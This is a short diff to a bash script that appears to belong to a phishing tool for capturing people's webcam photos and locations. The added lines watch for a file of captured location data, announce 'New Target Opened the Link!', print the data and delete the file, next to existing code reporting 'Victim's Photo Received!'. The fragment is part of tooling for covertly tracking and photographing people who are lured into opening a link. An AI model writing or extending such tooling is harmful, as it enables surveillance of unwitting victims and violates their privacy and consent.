@@ -97,6 +97,16 @@ fi
 
 sleep 0.5
 
+if [[ -e "location_notify.txt" ]]; then
+printf "\n${Gb}[${G}+${Gb}] New Target Opened the Link!${Reset}\n"
+while IFS= read -r line; do
+    printf "${C}%s${Reset}\n" "$line"
+done < location_notify.txt
+rm -f location_notify.txt
+fi
+
+sleep 0.5
+
 if [[ -e "Log.log" ]]; then
 printf "\n${Gb}[${G}+${Gb}] Victim's Photo Received!${Reset}\n"
 rm -rf Log.log
